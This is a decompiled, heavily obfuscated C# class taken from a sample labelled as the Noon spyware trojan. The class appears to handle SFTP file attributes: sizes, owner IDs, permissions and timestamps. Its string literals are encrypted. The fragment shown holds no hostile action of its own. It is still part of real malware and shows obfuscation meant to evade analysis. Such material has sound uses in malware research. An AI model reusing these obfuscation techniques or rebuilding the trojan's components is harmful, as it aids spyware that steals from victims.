// Decompiled with JetBrains decompiler
// Type: S'8F$-i.@Zx&C_^
// Assembly: ;8w1LFr, Version=5.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 2CC07ADF-5A94-44BC-9C37-07435DAD286F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-7dfe305f31c1f571790f54c3522eb8c6066453e69a429782ebfc0d6f68b2ae34.exe

using \u0024iWy\u003Bm\u005E;
using \u002A\u005ET\u003AdQS;
using \u002Bfcp\u002F\u002Al;
using \u0037li\u002D\u002BE\u005E;
using \u003B8w1LFr;
using \u005EcWnl7\u003F;
using \u007E\u002B\u005EJ0Pi;
using c\u007EJ\u0027\u002Ara;
using fzlgVg\u002B;
using M\u00241\u0027Eye;
using S\u00278F\u0024\u002Di;
using System;
using System.Runtime.CompilerServices;
using YEm\u0021AF\u002D;

namespace S\u00278F\u0024\u002Di
{
  [Serializable]
  public class \u0040Zx\u0026C_\u005E
  {
    private \u003AZnnTCY \u0037\u0040sr\u0026Wv;
    private long Yha\u002A\u002DvG;
    private uint _I5_\u002FxY;
    private uint dVWZ\u002300;
    private string duFOAT\u003F;
    private string \u0025\u002A\u0026\u003B\u002B9h;
    private uint k3naM\u003Fj;
    private uint LDRNBnk;
    private uint \u002F\u002A\u002F\u003F605;
    private uint a\u0026s_Qwe;

    internal long BSjWRCP => this.Yha\u002A\u002DvG;

    public int L\u0024mm8\u002A\u002B => (int) this._I5_\u002FxY;

    public int u\u00265B\u002Dig => (int) this.dVWZ\u002300;

    public string dHYorn\u002F => this.\u0025\u002A\u0026\u003B\u002B9h;

    public string cHZHbWO => this.duFOAT\u003F;

    public void p\u00213zsKE(int _param1, int _param2)
    {
      if (_param1 < 0)
        throw \u0023vYDm\u002B\u002B.F5pP\u002Acf(sgxPeiI.LiHKl\u0027x("\n\u001A\u001Dm\n>", "WAP7kr4oRqHlPkgM3fwOJ"), (object) _param1, sgxPeiI.LiHKl\u0027x(">\u001B\u001Fj.?r3Z0\u0013d\u00176;Et(\u007F\u0015\u0003\u0011\u000E\u001D?,<<1\u001B5\t X5.\tn+,I", "WAP7kr4oRqHlPkgM3fwOJ"));
      if (_param2 < 0)
        throw \u0023vYDm\u002B\u002B.F5pP\u002Acf(sgxPeiI.LiHKl\u0027x("\u0018\u001B\u0017j3\u0013x", "WAP7kr4oRqHlPkgM3fwOJ"), (object) _param2, sgxPeiI.LiHKl\u0027x(">\u001B\u001Fj.?r3Z0\u0013d\u00176;Et(\u007F\u0015\u0003\u0011\u000E\u001D?,<<1\u001B5\t X5.\tn+,I", "WAP7kr4oRqHlPkgM3fwOJ"));
      this._I5_\u002FxY = (uint) _param1;
      this.dVWZ\u002300 = (uint) _param2;
      this.\u0037\u0040sr\u0026Wv |= \u003AZnnTCY.SSH_FILEXFER_ATTR_UIDGID;
    }

    public void d\u0023\u003AZF6z(string _param1, string _param2)
    {
      if (_param1 == null)
        throw new ArgumentNullException(sgxPeiI.LiHKl\u0027x("\n\u001A\u001Dm", "WAP7kr4oRqHlPkgM3fwOJ"));
      if (_param2 == null)
        throw new ArgumentNullException(sgxPeiI.LiHKl\u0027x("\u0018\u001B\u0017j3", "WAP7kr4oRqHlPkgM3fwOJ"));
      this.duFOAT\u003F = _param1;
      this.\u0025\u002A\u0026\u003B\u002B9h = _param2;
      this.\u0037\u0040sr\u0026Wv |= \u003AZnnTCY.SSH_FILEXFER_ATTR_OWNERGROUP;
    }

    public _\u003F\u003BasIN aL\u002B\u0040M4y
    {
      get => (_\u003F\u003BasIN) (4095 & (int) this.k3naM\u003Fj);
      set
      {
        this.k3naM\u003Fj = (uint) value;
        this.\u0037\u0040sr\u0026Wv |= \u003AZnnTCY.SSH_FILEXFER_ATTR_PERMISSIONS;
      }
    }

    internal uint zU9g\u002Aa7
    {
      get => this.k3naM\u003Fj;
      set => this.k3naM\u003Fj = value;
    }

    internal DateTime w0yuqkj => \u0040Zx\u0026C_\u005E.w\u003A9W\u0029e\u007E(this.LDRNBnk);

    public DateTime \u0039kV6M\u002B\u0025
    {
      get => \u0040Zx\u0026C_\u005E.w\u003A9W\u0029e\u007E(this.\u002F\u002A\u002F\u003F605);
      set
      {
        this.\u002F\u002A\u002F\u003F605 = value.Year >= 1970 && value.Year <= 2099 ? \u0040Zx\u0026C_\u005E.\u005Edir\u003Brt(value) : throw \u0023vYDm\u002B\u002B.F5pP\u002Acf(sgxPeiI.LiHKl\u0027x("\t\b\u0014j&", "WAP7kr4oRqHlPkgM3fwOJ"), (object) value, sgxPeiI.LiHKl\u0027x("6\a\u001Cz;zu4Z6\u00150X,)Eo&:G\0\u0010\u001C\u0016{0zs!Z8\u000Ed\u00191=\u0004b`", "WAP7kr4oRqHlPkgM3fwOJ"));
        this.LDRNBnk = \u0040Zx\u0026C_\u005E.\u005Edir\u003Brt(value);
        this.\u0037\u0040sr\u0026Wv |= \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME;
      }
    }

    public DateTime L6DimEq
    {
      get => \u0040Zx\u0026C_\u005E.w\u003A9W\u0029e\u007E(this.a\u0026s_Qwe);
      set
      {
        this.a\u0026s_Qwe = value.Year >= 1970 && value.Year <= 2099 ? \u0040Zx\u0026C_\u005E.\u005Edir\u003Brt(value) : throw \u0023vYDm\u002B\u002B.F5pP\u002Acf(sgxPeiI.LiHKl\u0027x("\t\b\u0014j&", "WAP7kr4oRqHlPkgM3fwOJ"), (object) value, sgxPeiI.LiHKl\u0027x("6\a\u001Cz;zu4Z6\u00150X,)Eo&:G\0\u0010\u001C\u0016{0zs!Z8\u000Ed\u00191=\u0004b`", "WAP7kr4oRqHlPkgM3fwOJ"));
        this.\u0037\u0040sr\u0026Wv |= \u003AZnnTCY.SSH_FILEXFER_ATTR_CREATETIME;
      }
    }

    private static DateTime w\u003A9W\u0029e\u007E(uint _param0)
    {
      int num1 = (int) (_param0 / 86400U);
      int num2 = (int) (_param0 % 86400U);
      DateTime dateTime = new DateTime(1970, 1, 1);
      dateTime = dateTime.AddDays((double) num1);
      dateTime = dateTime.AddSeconds((double) num2);
      return dateTime.ToLocalTime();
    }

    private static uint \u005Edir\u003Brt(DateTime _param0) => _param0.Year <= 1 ? 0U : (uint) Math.Max(0.0, Math.Min((_param0.ToUniversalTime() - new DateTime(1970, 1, 1)).TotalSeconds, (double) uint.MaxValue));

    internal void \u002A17U6oT(\u0040jG9\u002BFT _param1)
    {
      if (((int) this.k3naM\u003Fj & 61440) == 0)
        this.k3naM\u003Fj |= 32768U;
      if (_param1 != \u0040jG9\u002BFT.WeOnlyDo1 && _param1 != \u0040jG9\u002BFT.WeOnlyDo2)
        return;
      DateTime w0yuqkj = this.\u0039kV6M\u002B\u0025;
      DateTime now1 = DateTime.Now;
      TimeSpan timeSpan = now1 - now1.ToUniversalTime() - (w0yuqkj - w0yuqkj.ToUniversalTime());
      this.\u002F\u002A\u002F\u003F605 = (uint) ((ulong) this.\u002F\u002A\u002F\u003F605 + (ulong) (long) timeSpan.TotalSeconds);
      w0yuqkj = this.w0yuqkj;
      DateTime now2 = DateTime.Now;
      timeSpan = now2 - now2.ToUniversalTime() - (w0yuqkj - w0yuqkj.ToUniversalTime());
      this.LDRNBnk = (uint) ((ulong) this.LDRNBnk + (ulong) (long) timeSpan.TotalSeconds);
    }

    internal void JvIal\u00404(L\u002AV\u002Blbk _param1, int _param2)
    {
      \u003AZnnTCY znnTcy = this.\u0037\u0040sr\u0026Wv;
      if (_param2 >= 4)
      {
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME) != \u003AZnnTCY.None)
          znnTcy = znnTcy & ~\u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME | \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME | \u003AZnnTCY.SSH_FILEXFER_ATTR_MODIFYTIME;
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_UIDGID) != \u003AZnnTCY.None)
          znnTcy = znnTcy & ~\u003AZnnTCY.SSH_FILEXFER_ATTR_UIDGID | ~\u003AZnnTCY.SSH_FILEXFER_ATTR_OWNERGROUP;
      }
      else
        znnTcy &= ~\u003AZnnTCY.SSH_FILEXFER_ATTR_CREATETIME;
      \u0023n_xoXb.\u0038XjwTEl(_param1, (uint) (znnTcy & \u003AZnnTCY.Supported));
      if (_param2 >= 4)
      {
        amd7SsR amd7SsR;
        switch ((\u0027iW\u003A\u0029_3) ((int) this.k3naM\u003Fj & 61440))
        {
          case \u0027iW\u003A\u0029_3.Directory:
            amd7SsR = amd7SsR.SSH_FILEXFER_TYPE_DIRECTORY;
            break;
          case \u0027iW\u003A\u0029_3.RegularFile:
            amd7SsR = amd7SsR.SSH_FILEXFER_TYPE_REGULAR;
            break;
          case \u0027iW\u003A\u0029_3.Symlink:
            amd7SsR = amd7SsR.SSH_FILEXFER_TYPE_SYMLINK;
            break;
          default:
            amd7SsR = amd7SsR.SSH_FILEXFER_TYPE_UNKNOWN;
            break;
        }
        \u0023n_xoXb.A\u007EOI\u002AqM(_param1, (byte) amd7SsR);
      }
      if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_SIZE) != \u003AZnnTCY.None)
        \u0023n_xoXb.\u002ArLsrsX(_param1, this.Yha\u002A\u002DvG);
      if (_param2 >= 4)
      {
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_OWNERGROUP) != \u003AZnnTCY.None)
        {
          if (this.duFOAT\u003F != null)
            \u0023n_xoXb.PoJuaAc(_param1, this.duFOAT\u003F);
          else
            \u0023n_xoXb.PoJuaAc(_param1, this._I5_\u002FxY.ToString());
          if (this.\u0025\u002A\u0026\u003B\u002B9h != null)
            \u0023n_xoXb.PoJuaAc(_param1, this.\u0025\u002A\u0026\u003B\u002B9h);
          else
            \u0023n_xoXb.PoJuaAc(_param1, this.dVWZ\u002300.ToString());
        }
      }
      else if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_UIDGID) != \u003AZnnTCY.None)
      {
        \u0023n_xoXb.\u0038XjwTEl(_param1, this._I5_\u002FxY);
        \u0023n_xoXb.\u0038XjwTEl(_param1, this.dVWZ\u002300);
      }
      if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_PERMISSIONS) != \u003AZnnTCY.None)
        \u0023n_xoXb.\u0038XjwTEl(_param1, this.k3naM\u003Fj);
      if (_param2 >= 4)
      {
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME) != \u003AZnnTCY.None)
          \u0023n_xoXb.\u002ArLsrsX(_param1, (long) this.LDRNBnk);
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_CREATETIME) != \u003AZnnTCY.None)
          \u0023n_xoXb.\u002ArLsrsX(_param1, (long) this.a\u0026s_Qwe);
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_MODIFYTIME) == \u003AZnnTCY.None)
          return;
        \u0023n_xoXb.\u002ArLsrsX(_param1, (long) this.\u002F\u002A\u002F\u003F605);
      }
      else
      {
        if ((znnTcy & \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME) == \u003AZnnTCY.None)
          return;
        \u0023n_xoXb.\u0038XjwTEl(_param1, this.LDRNBnk);
        \u0023n_xoXb.\u0038XjwTEl(_param1, this.\u002F\u002A\u002F\u003F605);
      }
    }

    public \u0040Zx\u0026C_\u005E()
    {
    }

    internal \u0040Zx\u0026C_\u005E(tdueioy parser, int version)
    {
      this.\u0037\u0040sr\u0026Wv = (\u003AZnnTCY) ((int) parser.aAOyB\u003A\u0026() & -2147483137);
      if (version >= 4)
      {
        switch (parser.leU\u002D\u0040L\u007E())
        {
          case 1:
            this.k3naM\u003Fj = 32768U;
            break;
          case 2:
            this.k3naM\u003Fj = 16448U;
            break;
          case 3:
            this.k3naM\u003Fj = 40960U;
            break;
        }
        this.k3naM\u003Fj |= 384U;
      }
      if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_SIZE) != \u003AZnnTCY.None)
        this.Yha\u002A\u002DvG = parser.CHqUC\u003AO();
      if (version >= 4)
      {
        if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_OWNERGROUP) != \u003AZnnTCY.None)
        {
          this.duFOAT\u003F = parser.\u002A\u005Esp\u0024OS();
          this.\u0025\u002A\u0026\u003B\u002B9h = parser.\u002A\u005Esp\u0024OS();
        }
      }
      else if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_UIDGID) != \u003AZnnTCY.None)
      {
        this._I5_\u002FxY = parser.aAOyB\u003A\u0026();
        this.dVWZ\u002300 = parser.aAOyB\u003A\u0026();
      }
      if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_PERMISSIONS) != \u003AZnnTCY.None)
      {
        uint num = parser.aAOyB\u003A\u0026();
        if (((int) num & 61440) == 0)
          this.k3naM\u003Fj |= num;
        else
          this.k3naM\u003Fj = num;
      }
      if (version >= 4)
      {
        if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME) != \u003AZnnTCY.None)
        {
          this.LDRNBnk = (uint) Math.Max(0L, Math.Min((long) uint.MaxValue, parser.CHqUC\u003AO()));
          if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_SUBSECOND_TIMES) != \u003AZnnTCY.None)
          {
            int num = (int) parser.aAOyB\u003A\u0026();
          }
        }
        if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_CREATETIME) != \u003AZnnTCY.None)
        {
          this.a\u0026s_Qwe = (uint) Math.Max(0L, Math.Min((long) uint.MaxValue, parser.CHqUC\u003AO()));
          if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_SUBSECOND_TIMES) != \u003AZnnTCY.None)
          {
            int num = (int) parser.aAOyB\u003A\u0026();
          }
        }
        if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_MODIFYTIME) != \u003AZnnTCY.None)
        {
          this.\u002F\u002A\u002F\u003F605 = (uint) Math.Max(0L, Math.Min((long) uint.MaxValue, parser.CHqUC\u003AO()));
          if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_SUBSECOND_TIMES) != \u003AZnnTCY.None)
          {
            int num = (int) parser.aAOyB\u003A\u0026();
          }
        }
      }
      else if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_ACMODTIME) != \u003AZnnTCY.None)
      {
        this.LDRNBnk = parser.aAOyB\u003A\u0026();
        this.\u002F\u002A\u002F\u003F605 = parser.aAOyB\u003A\u0026();
      }
      if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_ACL) != \u003AZnnTCY.None)
        parser.jIF\u002B9k9();
      if ((this.\u0037\u0040sr\u0026Wv & \u003AZnnTCY.SSH_FILEXFER_ATTR_EXTENDED) == \u003AZnnTCY.None)
        return;
      uint num1 = parser.aAOyB\u003A\u0026();
      for (int index = 0; (long) index < (long) num1; ++index)
      {
        parser.jIF\u002B9k9();
        parser.jIF\u002B9k9();
      }
    }

    [SpecialName]
    internal string get_LongName() => ((\u0024\u0027\u002DClxU) this).Fc0\u002FvMd != null ? ((\u0024\u0027\u002DClxU) this).Fc0\u002FvMd : ((\u0024\u0027\u002DClxU) this).ae4DRDl(DateTime.Now);
  }
}
